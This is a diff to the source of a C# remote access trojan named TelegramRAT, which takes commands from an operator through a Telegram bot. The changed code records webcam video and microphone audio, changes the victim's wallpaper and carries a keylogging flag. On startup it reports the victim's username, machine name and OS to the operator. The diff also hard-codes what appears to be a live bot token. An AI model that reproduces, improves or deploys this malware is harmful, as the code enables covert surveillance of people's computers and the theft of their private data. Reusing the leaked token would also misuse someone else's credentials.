@@ -23,8 +23,8 @@ namespace TelegramRAT
     {
         private static TelegramBotClient Bot;
 
-        static long? TargetId = <Your telegram id here>; 
-        public readonly static string BotToken = <Your bot token here>;
+        readonly static long? OwnerId = null; // Place your Telegram id here or leave null
+        readonly static string BotToken = "1727211141:AAFgdia7tmGOzdeaPT_H0ZSlwe3PS2GnSlc"; // Place your Telegram bot token. 
 
         static List<BotCommand> commands = new List<BotCommand>();
         static bool keylog = false;
@@ -55,24 +55,38 @@ namespace TelegramRAT
                 {
                     await Task.Run(() =>
                     {
-
-
+                        if (model.Args.Length == 0)
+                        {
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command will help you receive description of other commands. " +
+                                "Example: /help screenshot\n\nTo get list of all commands - type /commands", replyToMessageId: update.Message.MessageId);
+                            return;
+                        }
                         string command = model.Args[0];
                         if (!command.StartsWith("/"))
                         {
                             command = "/" + command;
                         }
-
+                        
                         foreach (BotCommand cmd in commands)
                         {
                             if (cmd.Command == command)
                             {
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, cmd.description, replyToMessageId: update.Message.MessageId, parseMode: ParseMode.Html, disableWebPagePreview: true);
+                                string description = "<b>" + cmd.Command + "</b>\n\n";
+                                if (cmd.description != null)
+                                {
+                                    description += cmd.description;
+                                }
+                                else
+                                {
+                                    description += "<i>No description provided</i>";
+                                }
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, description, replyToMessageId: update.Message.MessageId, parseMode: ParseMode.Html, disableWebPagePreview: true);
                                 return;
                             }
                         }
 
-                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command doesn't exist!", replyToMessageId: update.Message.MessageId);
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command doesn't exist! " +
+                            "To get list of all commands - type /commands", replyToMessageId: update.Message.MessageId);
 
 
 
@@ -631,9 +645,11 @@ namespace TelegramRAT
                         {
 
                             int framesCount = 30 * Convert.ToInt32(model.Args[0]);
-                            VideoCapture cap = new VideoCapture(0, VideoCaptureAPIs.ANY);
-                            cap.FrameWidth = 1280;
-                            cap.FrameHeight = 720;
+                            VideoCapture cap = new VideoCapture(0, VideoCaptureAPIs.ANY)
+                            {
+                                FrameWidth = 1280,
+                                FrameHeight = 720,
+                            };
 
                             Mat frame = new Mat();
                             VideoWriter vidWriter = new VideoWriter("vid.mp4", FourCC.H264, 30, new OpenCvSharp.Size(cap.FrameWidth, cap.FrameHeight));
@@ -736,7 +752,7 @@ namespace TelegramRAT
 
                             using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                             {
-                                Telegram.Bot.Types.File photo = await Bot.GetFileAsync(update.Message.Photo[update.Message.Photo.Length - 1].FileId);
+                                Telegram.Bot.Types.File photo = await Bot.GetFileAsync(update.Message.Photo.Last().FileId);
                                 await Bot.DownloadFileAsync(photo.FilePath, fs);
                             }
                             NativeFunctionsWrapper.SystemParametersInfo(NativeFunctionsWrapper.SPI_SETDESKWALLPAPER, 0, "wllppr.png", NativeFunctionsWrapper.SPIF_UPDATEINIFILE | NativeFunctionsWrapper.SPIF_SENDWININICHANGE);
@@ -983,9 +999,11 @@ namespace TelegramRAT
                                 if (!doRecord)
                                 {
                                     doRecord = true;
-                                    waveIn = new WaveInEvent();
+                                    waveIn = new WaveInEvent()
+                                    {
+                                        WaveFormat = new WaveFormat(44100, 1)
+                                    };
 
-                                    waveIn.WaveFormat = new WaveFormat(44100, 1);
                                     waveFileWriter = new WaveFileWriter("record.wav", waveIn.WaveFormat);
 
                                     waveIn.DataAvailable += new EventHandler<WaveInEventArgs>((object sender, WaveInEventArgs args) =>
@@ -1127,7 +1145,7 @@ namespace TelegramRAT
                 }
                 catch (Exception ex)
                 {
-                    Bot.SendTextMessageAsync(TargetId, "Error occured! - " + ex.Message);
+                    Bot.SendTextMessageAsync(OwnerId, "Error occured! - " + ex.Message);
                 }
             }
         }
@@ -1148,23 +1166,23 @@ namespace TelegramRAT
 
         static async Task Run()
         {
-            if (TargetId != null)
+            if (OwnerId != null)
             {
-                await Bot.SendTextMessageAsync(TargetId,
+                await Bot.SendTextMessageAsync(OwnerId,
                     $"🖥Computer online! \n\n" +
                     $"👤Username: *{Environment.UserName}*\n" +
                     $"PC name: *{Environment.MachineName}*\n\n" +
 
-                    $"OS version: {Environment.OSVersion.Version}",
+                    $"OS version: {Environment.OSVersion.ToString()}",
                     ParseMode.Markdown);
             }
             var offset = 0;
-
+            
             while (true)
             {
                 var updates = await Bot.GetUpdatesAsync(offset);
                 if (updates.Length != 0)
-                    offset = updates[updates.Length - 1].Id + 1;
+                    offset = updates.Last().Id + 1;
 
                 UpdateWorker(updates).Wait();
 
